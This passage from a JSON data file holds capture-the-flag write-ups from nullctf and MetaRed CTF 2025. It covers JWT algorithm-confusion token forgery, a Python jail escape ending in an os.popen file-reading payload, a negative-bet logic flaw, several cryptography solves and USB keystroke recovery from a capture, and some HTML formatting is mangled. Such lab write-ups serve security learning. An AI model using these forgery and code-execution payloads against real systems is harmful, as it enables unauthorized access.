<code>is_br0k3n_.ro</code>\n3.  <code>why_is_i7.ro</code>\n4.  <code>_4lw4ys_dns}.ro</code></p>\n<p>Combining these gives the final flag.</p>\n<h3>Flag</h3>\n<code>nullctf{dns_is_br0k3n_why_is_i7_4lw4ys_dns}</code>\n"
            },
            {
                "id": "next-jason",
                "title": "Next Jason",
                "category": "Web Exploitation",
                "tags": [
                    "cookie",
                    "jwt"
                ],
                "writeup": "<h3>Challenge Overview</h3>\nThe challenge provided a Next.js application implementing JWT-based authentication. The goal was to retrieve a flag protected by an admin check.                                                                                                                                    ## Vulnerabilities Identified\n<h4>1. Insecure Middleware Scope & Logic</h4>\nThe <code>middleware.js</code> file was configured to match only <code>/api/:path*</code> routes:\n<pre><code class=\"javascript\">export const config = {                                                                         matcher: '/api/:path*',\n};\n</code></pre>                                                                                         This left the token generation endpoint <code>/token/sign</code> (located at <code>app/token/sign/route.js</code>) exposed. Anyone could request this endpoint to generate a valid signed JWT for a non-admin user (e.g., \"guest\").\n<h4>2. JWT Algorithm Confusion                                                              The verification logic in <code>app/token/verify/route.js</code> insecurely allowed multiple algorithms:</h4>\n``<code>javascript                                                                               function verifyToken(token) {\n    return jwt.verify(token, PUBKEY, { algorithms: ['RS256', 'HS256'] });\n}\n<pre><code class=\"\">The server uses a Public Key (</code>PUBKEY<code>) to verify tokens. Standard tokens are signed with a Private Key using </code>RS256<code>. However, by allowing </code>HS256<code> (HMAC with SHA-256), the library treats the key provided (</code>PUBKEY<code>) as a *symmetric secret*.\n<p>This allows an attacker to sign a malicious token using </code>HS256<code> and the *Public Key* as the secret. The server, validating with the same Public Key and allowing </code>HS256<code>, will verify the signature as valid.\n                                                                                            ## Exploit Chain</p>\n<p>1. <strong>Obtain Valid \"Guest\" Token</strong>\n<ul>\n<li>We bypassed the middleware protection by hitting the exposed </code>/token/sign<code> endpoint.</li>\n<li><strong>Payload:</strong> </code>{\"username\": \"guest\"}<code></li>\n<li><strong>Result:</strong> A valid RS256 signed token.</li>\n</ul>\n2. <strong>Retrieve Public Key</strong>\n<ul>\n<li>The endpoint </code>/api/getPublicKey<code> is protected by middleware but allows access to users with a valid token.</li>\n<li>We sent a request to </code>/api/getPublicKey<code> with the valid \"guest\" token in the cookies.</li>\n<li><strong>Result:</strong> The server returned its Public Key.</li>\n</ul>\n3. <strong>Forge Admin Token</strong>\n<ul>\n<li>We created a new JWT with the payload </code>{\"username\": \"admin\"}<code>.</li>\n<li>We signed this token using the <strong>HS256</strong> algorithm, using the retrieved <strong>Public Key</strong> as the secret key.</li>\n<li>Code snippet:</li>\n</ul>\n     </code></pre>javascript\n     jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });\n     </code>`<code></p>\n<p>4. <strong>Retrieve Flag</strong>\n<ul>\n<li>We sent the forged admin token to </code>/api/getFlag<code>.</li>\n<li>The server verified the token (believing it to be valid because the signature matched the Public Key processed as an HMAC secret) and saw </code>username: \"admin\"<code>.</li>\n<li><strong>Result:</strong> The server returned the flag.</li>\n</ul>\n<h3>Flag</h3>\n</code>nullctf{f0rg3_7h15_cv3_h3h_a44452394d983966}`</p>\n"
            },
            {
                "id": "reservation",
                "title": "Reservation",
                "category": "Web Exploitation",
                "tags": [],
                "writeup": "<p>The challenge involves a simple TCP server that asks for a \"secret passphrase received from the environment\". The Python source code (reservation.py) reveals that the server compares the user input against an environment variable named PROMPT.</p>\n<p>PROMPT = os.getenv(\"PROMPT\", \"bananananannaanan\")\n...\nif response == PROMPT:\n    client_socket.sendall(b\"Thank you for your patience. Here is your flag: \" + FLAG.encode())</p>\n<p>The server's banner ([windows_10 | cmd.exe]) and a curious comment in the source code about the WINDIR environment variable (<code># This is missing from the .env file, but it still printed something, interesting</code>) strongly hint that the server is running on a Windows environment, or an environment designed to emulate Windows environment variables.</p>\n<p>On Windows systems, the default value for the PROMPT environment variable is $P$G (which stands for current Path + Greater-than symbol).</p>\n<p>Therefore, sending \"$P$G\" as the passphrase satisfies the server's check and returns the flag.</p>\n<p>Flag:\nnullctf{why_1s_it_r3srv3d_ceed3c0e6c3d10c3}</p>\n"
            },
            {
                "id": "witching-hour",
                "title": "Witching Hour",
                "category": "Cryptography",
                "tags": [
                    "cipher",
                    "xor"
                ],
                "writeup": "<h3>Challenge Analysis</h3>\nWe are provided with a generation script <code>gen.py</code> that implements a curve based on a hidden parameter <code>a</code>.\nThe parameter <code>a</code> is a fraction <code>n/d</code> where <code>n</code> and <code>d</code> are generated as random 2048-bit primes.\nThe script calculates points <code>(x, y)</code> using the formula:\ny = a^3 / (x^2 + a^2)\n<p>This is the standard equation for the <strong>Witch of Agnesi</strong> curve.</p>\n<h3>Derivation</h3>\nLet's substitute <code>a = n/d</code> into the equation:\n<p>y = (n/d)^3 / (x^2 + (n/d)^2)\n  = (n^3 / d^3) / (x^2 + n^2 / d^2)</p>\n<p>Multiply numerator and denominator by <code>d^2</code> to simplify the lower fraction:\ny = (n^3 / d^3) / ((x^2 * d^2 + n^2) / d^2)\n  = (n^3 * d^2) / (d^3 * (x^2 * d^2 + n^2))\n  = n^3 / (d * (x^2 * d^2 + n^2))\n  = n^3 / (x^2 * d^3 + n^2 * d)</p>\n<p>So we have the point <code>y</code> represented as a fraction:\nNumerator: <code>n^3</code>\nDenominator: <code>x^2 * d^3 + n^2 * d</code></p>\n<p>Since <code>n</code>, <code>d</code>, and <code>x</code> are distinct large primes, <code>gcd(n^3, x^2 * d^3 + n^2 * d) == 1</code> is almost guaranteed. This means the fraction given in <code>points.txt</code> is already in its simplest form (irreducible).</p>\n<h3>Solution Strategy</h3>\n1. <strong>Recover <code>n</code></strong>:\n   From <code>points.txt</code>, take the numerator of <code>y</code>.\n   n = cubic_root(y_numerator)\n<p>2. <strong>Recover <code>d</code></strong>:\n   From <code>points.txt</code>, take the denominator of <code>y</code> (let's call it <code>Y_den</code>).\n   We know: <code>Y_den = x^2 * d^3 + n^2 * d</code>\n   Rearranging this gives us a cubic equation for <code>d</code>:\n   <code>x^2 * d^3 + n^2 * d - Y_den = 0</code></p>\n<p>Since <code>f(d) = x^2 * d^3 + n^2 * d - Y_den</code> is strictly increasing for <code>d > 0</code>, we can easily find the unique positive integer root <code>d</code> using binary search.</p>\n<p>3. <strong>Decrypt</strong>:\n   Reconstruct the key string <code>a = \"n/d\"</code>.\n   The key is <code>sha256(a).digest()</code>.\n   XOR the ciphertext from <code>ciphertext.hex</code> with this key (repeating) to reveal the flag.</p>\n<h3>Flag</h3>\n<code>nullctf{I_w0nder_wh0_!s_th3_w!tch_0f_Agn3s!?_6920686f7065207468652063746620776173206e696365}</code>\n"
            },
            {
                "id": "abcdef",
                "title": "abcdef",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<h3>Challenge Overview</h3>\nWe are presented with a Python jail (<code>jail.py</code>) running on a server. The jail accepts user input and executes it using <code>eval()</code>, but enforces an extremely strict character filter via the <code>is_valid()</code> function.\n<h4>Constraints</h4>\n1.  <strong>Allowed Characters:</strong> 'a', 'b', 'c', 'd', 'e', 'f' (case-insensitive).\n2.  <strong>Allowed Extras:</strong> Digits (0-9) and all printable ASCII symbols (e.g., <code>_</code>, <code>.</code>, <code>(</code>, <code>)</code>, <code>[</code>, <code>]</code>, <code>{</code>, <code>}</code>).\n3.  <strong>Forbidden:</strong> All other alphabetic characters (g-z).\n4.  <strong>Escapes:</strong> <code>\\x</code> escapes are effectively banned because 'x' is a forbidden character.\n<h4>The Code</h4>\n<pre><code class=\"python\">abcdef = set(\"abcdef\")\n<p>def is_valid(text):\n    for c in text:\n        # ... (ascii checks)\n        if c.isalpha() and c not in abcdef:\n            return False\n    return True\n&lt;h2&gt;... loop with input() and eval()&lt;/h2&gt;\n</code></pre></p>\n<h3>Solution Analysis</h3>\n<p>The core vulnerability lies in the fact that <code>abcdef</code> is a mutable <code>set</code> available in the global scope. If we can add characters to this set, the <code>is_valid</code> function will allow them in subsequent inputs.</p>\n<p>To call <code>abcdef.add(char)</code>, we need a reference to the character <code>char</code>. Since we cannot type forbidden characters directly, we must \"harvest\" them from existing objects available in the environment using only allowed syntax.</p>\n<h4>Harvesting Characters</h4>\nWe can generate strings containing forbidden characters by taking the representation (<code>repr</code> or <code>str</code>) of available objects.\n<ul>\n<li>  <code>abcdef.add</code> is a built-in method.</li>\n<li>  <code>f\"{abcdef.add}\"</code> evaluates to a string like: <code><built-in method add of set object at 0x...></code></li>\n<li>  <code>(1).__add__</code> is a method wrapper.</li>\n<li>  <code>f\"{(1).__add__}\"</code> evaluates to a string like: <code><method-wrapper '__add__' of int object at 0x...></code></li>\n</ul>\nThese strings contain the characters <code>i</code>, <code>m</code>, <code>p</code>, <code>o</code>, <code>r</code>, <code>t</code>, <code>s</code>, <code>n</code> needed to construct <code>print</code>, <code>__import__</code>, <code>os</code>, and <code>popen</code>.\n<p>By calculating the index of each character in these strings, we can extract them. For example, <code>f\"{abcdef.add}\"[3]</code> is 'i'.</p>\n<h4>Step 1: The Jailbreak Payload</h4>\nWe construct a list of <code>abcdef.add(...)</code> calls. This payload itself only uses <code>a-f</code>, digits, and symbols.\n<pre><code class=\"python\">[\n    abcdef.add(f\"{abcdef.add}\"[3]),   # i\n    abcdef.add(f\"{abcdef.add}\"[10]),  # m\n    abcdef.add(f\"{(1).__add__}\"[11]), # p\n    abcdef.add(f\"{abcdef.add}\"[14]),  # o\n    abcdef.add(f\"{(1).__add__}\"[9]),  # r\n    abcdef.add(f\"{abcdef.add}\"[5]),   # t\n    abcdef.add(f\"{abcdef.add}\"[24]),  # s\n    abcdef.add(f\"{abcdef.add}\"[8])    # n\n]\n</code></pre>\n<strong>Minified Input 1:</strong>\n<pre><code class=\"python\">[abcdef.add(f\"{abcdef.add}\"[3]),abcdef.add(f\"{abcdef.add}\"[10]),abcdef.add(f\"{(1).__add__}\"[11]),abcdef.add(f\"{abcdef.add}\"[14]),abcdef.add(f\"{(1).__add__}\"[9]),abcdef.add(f\"{abcdef.add}\"[5]),abcdef.add(f\"{abcdef.add}\"[24]),abcdef.add(f\"{abcdef.add}\"[8])]\n</code></pre>\n<h4>Step 2: Arbitrary Code Execution</h4>\nOnce the characters are added to <code>abcdef</code>, the <code>is_valid</code> function allows us to use them. We can now write standard Python code to read the flag. We use <code>print</code> because <code>eval</code> doesn't display output automatically in this loop.\n<p><strong>Input 2:</strong>\n<pre><code class=\"python\">print(__import__('os').popen('cat f*').read())\n</code></pre></p>\n<h3>Flag</h3>\n<code>nullctf{g!bb3r!sh_d!dnt_st0p_y0u!}</code>\n"
            },
            {
                "id": "double_it_and_give_it_to_the_next_person",
                "title": "double_it_and_give_it_to_the_next_person",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "image"
                ],
                "writeup": "<h4>Challenge Overview</h4>\n<p>The challenge provides a source script <code>chal.sage</code> and an output file <code>output.txt</code>. The script implements a cryptographic scheme using the NIST P-256 elliptic curve. It generates two secret scalars, <code>key1</code> and <code>key2</code>, and then runs two iterations of a process where it:</p>\n<p>1. Generates a random point P.</p>\n<p>2. Computes Q=2P (point doubling).</p>\n<ul>\n<li>Obfuscates the x-coordinates of P and Q using linear equations involving the secret keys and random coefficients.</li>\n</ul>\nThe goal is to recover <code>key1</code> and <code>key2</code> to construct the flag: <code>nullctf{key1 ^ key2}</code>.\n<h4>Analysis</h4>\n<p>#### 1. The Source Code</p>\n<p>The script uses the standard NIST P-256 curve where a=\u22123. For each iteration, the output gives us:</p>\n<ul>\n<li>P.x=a\u22c5key1+b</li>\n<li>Q.x=c\u22c5key2+d</li>\n</ul>\nWe are given two sets of these equations (from two iterations). Let's denote the known coefficients for iteration i as Ai\u200b,Bi\u200b,Ci\u200b,Di\u200b. Thus:\n<p>xPi\u200b\u200b=Ai\u200b\u22c5k1\u200b+Bi\u200b</p>\n<p>xQi\u200b\u200b=Ci\u200b\u22c5k2\u200b+Di\u200b</p>\n<p>#### 2. The Vulnerability: Point Doubling</p>\n<p>The core weakness lies in the mathematical relationship between P and Q. Since Q=2P, the x-coordinate of Q is determined solely by the x-coordinate of P (and the curve parameters).</p>\n<p>The formula for point doubling on a curve y2=x3+ax+b provides the x-coordinate of Q:</p>\n<p>xQ\u200b=(2yP\u200b3xP2\u200b+a\u200b)2\u22122xP\u200b</p>\n<p>We can eliminate the yP\u200b term by substituting the curve equation yP2\u200b=xP3\u200b+axP\u200b+b:</p>\n<p>xQ\u200b=4(xP3\u200b+axP\u200b+b)(3xP2\u200b+a)2\u200b\u22122xP\u200b</p>\n<p>This rational function relates xQ\u200b entirely to xP\u200b.</p>\n<h4>Solution Strategy</h4>\n<p>1. <strong>Express k2\u200b in terms of k1\u200b:</strong> Substitute the linear equations into the doubling formula. Since xP\u200b depends only on k1\u200b and xQ\u200b depends only on k2\u200b, we can rearrange the doubling formula to isolate k2\u200b.</p>\n<p>Ci\u200b\u22c5k2\u200b+Di\u200b=DoublingFormula(Ai\u200b\u22c5k1\u200b+Bi\u200b)</p>\n<p>k2\u200b=Ci\u200bDoublingFormula(Ai\u200b\u22c5k1\u200b+Bi\u200b)\u2212Di\u200b\u200b</p>\n<p>2. <strong>Equate and Solve:</strong> Since k1\u200b and k2\u200b are constant across iterations, the value of k2\u200b derived from iteration 0 must equal the value derived from iteration 1.</p>\n<p>k2\u200b(from\u00a0iter\u00a00)=k2\u200b(from\u00a0iter\u00a01)</p>\n<p>This creates a polynomial equation with a single unknown, k1\u200b.</p>\n<p>3. <strong>Root Finding:</strong> The resulting polynomial is of degree 7 (due to the cubic terms in the curve equation squared). We can solve for the roots of this polynomial over the finite field GF(p) to find k1\u200b.</p>\n<h4>Solution Script</h4>\n<p>The following SageMath script implements the algebra described above.</p>\n<p><strong>Note:</strong> If running on a system without SageMath (like a minimal Fedora install), this can be run via Docker/Podman using the <code>sagemath/sagemath</code> image.</p>\n<p>Python</p>\n<pre><code class=\"python\">from sage.all import *\n<p>&lt;h2&gt;P-256 Curve Parameters&lt;/h2&gt;\np = 2<strong>256 - 2</strong>224 + 2<strong>192 + 2</strong>96 - 1\na_curve = -3\nb_curve = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</p>\n<p>&lt;h2&gt;Data parsed from output.txt&lt;/h2&gt;\n&lt;h2&gt;Iteration 0&lt;/h2&gt;\nA0 = 101391067652419278504279072061964396163420598174591672104811496061093042423713\nB0 = 110183945624921546387413554986656742713737778649772602611818367446708850272293\nC0 = 43935985468030112938420167350551592897480789520688041577831275174910738854569\nD0 = 13245902077735905939963311540878792271896625592735457462639747889134751588655</p>\n<p>&lt;h2&gt;Iteration 1&lt;/h2&gt;\nA1 = 113113920295449343615508981422751944711310245958533784150505930220126533492423\nB1 = 3292039546575820821367398987680176504505470559384412397685623175088154966631\nC1 = 90189751456536603500768763858048652235807590023038279530146107092251468907921\nD1 = 93980984745553841375952018332854663310402153214300203815947697055365029221289</p>\n<p>&lt;h2&gt;1. Setup Ring&lt;/h2&gt;\nF = GF(p)\nR = PolynomialRing(F, 'x')\nx = R.gen() # x represents the unknown key1</p>\n<p>data = [(A0, B0, C0, D0), (A1, B1, C1, D1)]\nnumerators = []\ndenominators = []</p>\n<p>print(\"[*] Constructing polynomials...\")\nfor A, B, C, D in data:\n    # xP expressed in terms of key1 (x)\n    xP = A * x + B</p>\n<p># Calculate yP^2 from curve equation\n    yP_sq = xP**3 + a_curve * xP + b_curve</p>\n<p># Doubling formula relation: \n    # xQ = ((3xP^2 + a)^2) / (4yP^2) - 2xP\n    # Substituting xQ = C*k2 + D and rearranging for k2:\n    # k2 = [ (3xP^2 + a)^2 - (8xP + 4D)*yP^2 ] / [ 4*C*yP^2 ]</p>\n<p>term_num = (3*xP<strong>2 + a_curve)</strong>2 - (8*xP + 4*D) * yP_sq\n    term_den = 4 * C * yP_sq</p>\n<p>numerators.append(term_num)\n    denominators.append(term_den)</p>\n<p>&lt;h2&gt;2. Equate the two expressions for k2&lt;/h2&gt;\n&lt;h2&gt;num0 / den0 = num1 / den1  =&gt;  num0 * den1 - num1 * den0 = 0&lt;/h2&gt;\nfinal_poly = numerators[0] * denominators[1] - numerators[1] * denominators[0]</p>\n<p>print(\"[*] Finding roots (candidates for key1)...\")\nroots = final_poly.roots()</p>\n<p>for r, multiplicity in roots:\n    try:\n        k1_candidate = r</p>\n<p># Recover key2 using the first iteration\n        num = numerators<a href=\"k1_candidate\" target=\"_blank\">0</a>\n        den = denominators<a href=\"k1_candidate\" target=\"_blank\">0</a></p>\n<p>if den == 0: continue\n        k2_candidate = num / den</p>\n<p># Calculate Flag\n        val_k1 = int(k1_candidate)\n        val_k2 = int(k2_candidate)\n        flag_val = val_k1 ^ val_k2</p>\n<p>print(f\"Flag: nullctf{{{flag_val:064x}}}\")\n        break\n    except Exception as e:\n        print(f\"Error: {e}\")\n</code></pre></p>\n<h3>Flag: nullctf{25b6b8151d54b7f9e5fc3181e1d5b5a97464d019dde57aca90df349a8c951a02}</h3>\n"
            },
            {
                "id": "iuesbitaipsi",
                "title": "iuesbitaipsi",
                "category": "Forensics",
                "tags": [
                    "pcap",
                    "shark"
                ],
                "writeup": "<p>1.  <strong>Initial Reconnaissance:</strong> I started by examining the provided files, <code>nullctf.pcapng</code> and <code>README.md</code>. The <code>README.md</code> was empty.</p>\n<p>2.  <strong>Pcapng Analysis with tshark:</strong> I identified <code>nullctf.pcapng</code> as a packet capture file. Initial <code>tshark</code> commands (<code>tshark -r nullctf.pcapng | head -n 10</code>) showed USB traffic.\n    <code>tshark -r nullctf.pcapng -q -z conv,usb</code> revealed significant data transfer on USB device address 5 (endpoints 1.5.1 and 1.5.4), indicating potential HID (Human Interface Device) or mass storage activity.</p>\n<p>3.  <strong>Troubleshooting tshark Data Extraction:</strong> Multiple attempts to extract raw data or specific fields using <code>tshark</code> (e.g., <code>usb.capdata</code>, <code>usb.hid.data</code>, <code>-x</code>, <code>-T json</code>) to various output files consistently resulted in empty files, despite the <code>pcapng</code> being 13MB in size. This suggested an issue with <code>tshark</code>'s file output or a specific nuance of this <code>pcapng</code> file that prevented standard extraction.</p>\n<p>4.  <strong>Identifying the Data Type:</strong> Given the USB traffic and large data volume, it was highly probable that the flag was hidden within HID keyboard input (scancodes).</p>\n<p>5.  <strong>Scapy for USB HID Decoding:</strong> Since <code>tshark</code> was problematic for extraction, I decided to use <code>scapy</code>, a powerful Python packet manipulation library.\n<ul>\n<li>  I first checked for <code>scapy</code> installation (<code>python3 -c \"import scapy.all\"</code>), which showed it was not installed.</li>\n<li>  I installed <code>scapy</code> using <code>pip install scapy</code>.</li>\n</ul>\n6.  <strong>Python Script Development:</strong> I developed a Python script (<code>extract_usb_hid.py</code>) to:\n<ul>\n<li>  Load the <code>nullctf.pcapng</code> file using <code>scapy.all.rdpcap</code>.</li>\n<li>  Iterate through packets, filtering for <code>USBpcap</code> layers that also contained a <code>Raw</code> layer (indicating data).</li>\n<li>  Heuristically identified 8-byte <code>Raw</code> payloads as potential HID keyboard reports.</li>\n<li>  Parsed the modifier byte (byte 0) and scancode byte (byte 2) from these reports.</li>\n<li>  Implemented a <code>scancode_map</code> to convert USB HID scancodes to ASCII characters, handling both unshifted and shifted key presses.</li>\n</ul>\n7.  <strong>Script Debugging:</strong>\n<ul>\n<li>  Initially, the script had a <code>SyntaxError</code> due to an unescaped backslash in the <code>scancode_map</code>, which was corrected.                                                                 *   Next, <code>ImportError: cannot import name 'USBPcap' from 'scapy.all'</code> occurred. I corrected the import to <code>from scapy.layers.usb import USBPcap</code>.</li>\n<li>  Another <code>ImportError</code> revealed a case sensitivity issue: the correct import was <code>from scapy.layers.usb import USBpcap</code> (lowercase 'p'), which was then also applied to <code>packet.haslayer(USBpcap)</code>.</li>\n</ul>\n8.  <strong>Flag Extraction:</strong> After correcting the Python script, executing <code>python3 extract_usb_hid.py nullctf.pcapng</code> successfully outputted a string. The first part of the output clearly resembled a flag format: <code>nullctf{4nd_7h47s_h0w_4_k3yl0gg3r_w0rks}</code>. The remaining characters were likely noise from imperfect scancode mapping or other key events not directly relevant to the flag.</p>\n<p>The flag is: <code>nullctf{4nd_7h47s_h0w_4_k3yl0gg3r_w0rks}</code></p>\n"
            }
        ]
    },
    "MetaRed CTF 2025": {
        "rank": "66th place",
        "description": "Specialized competition focusing on red team operations and offensive security techniques.",
        "challenges": [
            {
                "id": "21-blackjack",
                "title": "21 Blackjack",
                "category": "Miscellaneous",
                "tags": [],
                "writeup": "<p>Beginner\n<h3>Initial Observations</h3></p>\n<p>Relevant code portion:\n<pre><code class=\"\">\nbet = float(input(\"Enter your bet amount: \").strip())\nif bet &gt; coins:     \n\tprint(\"Invalid bet.\")     \n\tcontinue  ...  \nif guess == winning:     \n\tcoins += bet * 2 \nelse:     \n\tcoins -= bet\n</code></pre></p>\n<p>There is <strong>no validation</strong> that the bet must be positive.</p>\n<p>---</p>\n<h3>Vulnerability Analysis</h3>\n<p>The game checks:</p>\n<p><code>if bet > coins:</code></p>\n<p>but <strong>does not check for negative values</strong>, allowing bets such as:</p>\n<p><code>-99999999999</code></p>\n<p>If the guess is wrong (which is extremely likely because the range is 0\u20131,000,000):</p>\n<p><code>coins -= bet</code></p>\n<p>If bet is negative:</p>\n<p><code>coins = coins - (-99999999999)</code>\n<code>coins = coins + 99999999999</code></p>\n<p>This results in the balance skyrocketing instead of decreasing.</p>\n<p>---</p>\n<h3>Exploitation</h3>\n<h4>Step 1 \u2014 Start Game</h4>\n<p><code>python3 21blackjack.py</code></p>\n<h4>Step 2 \u2014 Choose Play</h4>\n<p><code>1</code></p>\n<h4>Step 3 \u2014 Use Negative Bet</h4>\n<p><code>Enter your bet: -99999999999</code>\n<code>Enter your guess: 1</code></p>\n<h4>Step 4 \u2014 Intentionally Lose</h4>\n<p>You almost certainly lose, causing coins to increase drastically.</p>\n<h4>Step 5 \u2014 Buy Flag</h4>\n<p><code>2</code></p>\n<p>---</p>\n<h3>\ud83c\udfaf Flag</h3>\n<p><code>UNLP{IlovethisTown.ILoveThisGameAnd,Jim,IMightEvenLoveYou}</code></p>\n"
            },
            {
                "id": "antichrist",
                "title": "Antichrist",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "cipher",
                    "xor"
                ],
                "writeup": "<p>This challenge consisted of three levels of cryptographic puzzles, building upon each other.</p>\n<p>---\nLevel 1: Repeating XOR Key\n---</p>\n<p>Initial analysis of the provided <code>certunlp_2025_crypto_antichrist.txt</code> file revealed several plaintext-ciphertext pairs, with ciphertexts represented in hexadecimal.</p>\n<p>Example pairs:\n<ul>\n<li>\"How are you?\": <code>040e0553371d0b740b06104d</code></li>\n<li>\"How old are you?\": <code>040e055339030a74131b0052350e074c</code></li>\n<li>etc.</li>\n</ul>\nThe lengths of the plaintexts matched the byte lengths of their respective hex ciphertexts, strongly suggesting a repeating XOR cipher. To find the key, I performed an XOR operation between each plaintext and its corresponding ciphertext (<code>Key = Plaintext XOR Ciphertext</code>).</p>\n<p>Python script <code>analyze_keys.py</code>:\n<pre><code class=\"python\">def xor_bytes(a, b):\n    return bytes([x ^ y for x, y in zip(a, b)])</p>\n<p>examples = [\n    (b\"How are you?\", bytes.fromhex(\"040e0553371d0b740b06104d\")),\n    (b\"How old are you?\", bytes.fromhex(\"040e055339030a74131b0052350e074c\")),\n    (b\"Plaintext\", bytes.fromhex(\"1c0d131a381b0b2c06\")),\n    (b\"You already understood where it goes\", bytes.fromhex(\"150e075337031c31130d1c52390f1616241c1a3b1d0d45052404001676061a741506000173\")),\n    (b\"Last example\", bytes.fromhex(\"00000107760a16351f190917\")),\n]</p>\n<p>for i, (p, c) in enumerate(examples):\n    key = xor_bytes(p, c)\n    print(f\"Key {i}: {key.hex()}\")\n    try:\n        print(f\"Key {i} (text): {key}\")\n    except:\n        pass\n</code></pre></p>\n<p>Running this script revealed a repeating key: <code>LarsVonTrier</code>.</p>\n<p>---\nLevel 2: Decrypting with the Repeating XOR Key\n---</p>\n<p>The challenge then presented a long hexadecimal string as \"Level 2\" ciphertext. Using the identified key \"LarsVonTrier\", I decrypted this ciphertext.</p>\n<p>Python script <code>solve_level2.py</code>:\n<pre><code class=\"python\">def xor_decrypt(ciphertext, key):\n    decrypted = bytearray()\n    key_len = len(key)\n    for i, byte in enumerate(ciphertext):\n        decrypted.append(byte ^ key[i % key_len])\n    return decrypted</p>\n<p>with open(\"certunlp_2025_crypto_antichrist.txt\", \"r\") as f:\n    content = f.read()</p>\n<p>parts = content.split(\"Now decrypt level 2:\\n\")\nhex_cipher = parts[1].strip().replace(\"\\n\", \"\")\nciphertext = bytes.fromhex(hex_cipher)</p>\n<p>key = b\"LarsVonTrier\"</p>\n<p>plaintext = xor_decrypt(ciphertext, key)\nprint(plaintext.decode('utf-8', errors='replace'))\n</code></pre></p>\n<p>The decrypted text for Level 2 provided instructions for \"Nivel 3\" and new plaintext-ciphertext pairs.</p>\n<p>Decrypted Level 2 output:\n<pre><code class=\"\">Nice Job. Next:</p>\n<p>Lars Von Trier: e78e3e12b5ab712afa912317ed8a\nLara Croft: e78e3e00b5ac6c2ca1b7\nLa vida es bella: e78e6c17ae9c6453aacf2142efc1284f\nEl padrino: ee83651caf977611b391\nEl gran hotel budapest!: ee83650bbc85794abaca6540a28f6b15a49b7f11a78a2d</p>\n<p>Nivel 3: e5862d0ca7c344499dc31645ce8a1c0ac297491e8e904245c9ec2f4ccfd8294de5c4275dbdda234fefda295dddea0563c7f43f66\n</code></pre></p>\n<p>---\nLevel 3: Autokey-like Cipher\n---</p>\n<p>The new plaintext-ciphertext pairs for Level 3 indicated a more complex encryption. Initial attempts to find a simple repeating XOR key failed, as the derived keys varied.</p>\n<p>Analyzing the relationship <code>C[i] = P[i] XOR K[i]</code> for each pair:\n<ul>\n<li>The first two bytes of the derived key (<code>K[0]</code>, <code>K[1]</code>) were consistently <code>0xab</code> and <code>0xef</code> across all examples.</li>\n<li><code>K[0] = P[0] XOR C[0]</code></li>\n<li><code>K[1] = P[1] XOR C[1]</code></li>\n<li>For <code>i >= 2</code>, a pattern emerged where <code>K[i]</code> seemed to be derived from a previous ciphertext byte XORed with one of the initial key bytes. Specifically, <code>K[i] = C[i-2] XOR K[i % 2]</code>.</li>\n</ul>\nThis led to the full encryption/decryption algorithm:</p>\n<p>Decryption algorithm for Level 3:\n<ul>\n<li>For <code>i = 0</code>: <code>P[0] = C[0] XOR 0xab</code></li>\n<li>For <code>i = 1</code>: <code>P[1] = C[1] XOR 0xef</code></li>\n<li>For <code>i >= 2</code>: <code>P[i] = C[i] XOR (C[i-2] XOR (0xab if i is even else 0xef))</code></li>\n</ul>\nPython script <code>solve_level3.py</code>:\n<pre><code class=\"python\">def decrypt_level3(hex_cipher):\n    ciphertext = bytes.fromhex(hex_cipher)\n    plaintext = bytearray()</p>\n<p>k0 = 0xab # Constant for even indices\n    k1 = 0xef # Constant for odd indices</p>\n<p>for i in range(len(ciphertext)):\n        c = ciphertext[i]\n        if i == 0:\n            p = c ^ k0\n        elif i == 1:\n            p = c ^ k1\n        else:\n            prev_c = ciphertext[i-2]\n            k = k0 if i % 2 == 0 else k1\n            p = c ^ prev_c ^ k\n        plaintext.append(p)</p>\n<p>return plaintext</p>\n<p>cipher_str = \"e5862d0ca7c344499dc31645ce8a1c0ac297491e8e904245c9ec2f4ccfd8294de5c4275dbdda234fefda295dddea0563c7f43f66\"\ndecrypted = decrypt_level3(cipher_str)\nprint(decrypted)\nprint(decrypted.decode('utf-8', errors='replace'))\n</code></pre></p>\n<p>Running this script yielded the following text: <code>Nice! Here is your flag: FMOK{Mzgfiv1h5zgzmh_XsfixS}</code>.</p>\n<p>---\nFinal Flag Transformation: Atbash Cipher\n---</p>\n<p>The decrypted string <code>FMOK{Mzgfiv1h5zgzmh_XsfixS}</code> did not immediately look like a standard flag format (e.g., <code>flag{...}</code>). However, the prefix <code>FMOK</code> and the context of <code>certunlp</code> in the filename suggested a potential Atbash cipher.</p>\n<p>Applying Atbash (A<->Z, a<->z) to <code>FMOK{Mzgfiv1h5zgzmh_XsfixS}</code>:\n<ul>\n<li><code>FMOK</code> became <code>UNLP</code> (Universidad Nacional de La Plata, consistent with <code>certunlp</code>).</li>\n<li><code>Mzgfiv</code> became <code>Nature</code></li>\n<li><code>1h5</code> became <code>1s5</code></li>\n<li><code>zgzmh</code> became <code>atans</code></li>\n<li><code>XsfixS</code> became <code>ChurcH</code></li>\n</ul>\nPython script <code>solve_atbash.py</code>:\n<pre><code class=\"python\">def atbash(text):\n    result = \"\"\n    for char in text:\n        if 'A' &lt;= char &lt;= 'Z':\n            result += chr(ord('Z') - (ord(char) - ord('A')))\n        elif 'a' &lt;= char &lt;= 'z':\n            result += chr(ord('z') - (ord(char) - ord('a')))\n        else:\n            result += char\n    return result</p>\n<p>ciphertext = \"FMOK{Mzgfiv1h5zgzmh_XsfixS}\"\nprint(atbash(ciphertext))\n</code></pre></p>\n<p>The fully transformed string was <code>UNLP{Nature1s5atans_ChurcH}</code>. This phrase, \"Nature is Satan's Church\", is a well-known quote from the movie \"Antichrist\" by Lars Von Trier, which is the name of the challenge, further confirming the correctness of the decryption and transformation.</p>\n"
            },
            {
                "id": "cidade-de-deus",
                "title": "Cidade De Deus",
                "category": "Miscellaneous",
                "tags": [],
